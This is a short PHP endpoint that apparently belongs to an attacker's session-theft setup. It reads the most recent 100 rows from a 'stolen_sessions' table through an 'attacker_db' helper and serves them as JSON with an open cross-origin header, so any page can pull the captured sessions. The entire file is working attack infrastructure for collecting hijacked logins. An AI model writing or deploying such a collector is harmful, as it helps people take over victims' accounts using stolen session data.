<?php
require_once __DIR__ . '/db.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$rows = attacker_db()
    ->query('SELECT * FROM stolen_sessions ORDER BY id DESC LIMIT 100')
    ->fetchAll();

echo json_encode(['count' => count($rows), 'sessions' => $rows], JSON_PRETTY_PRINT);
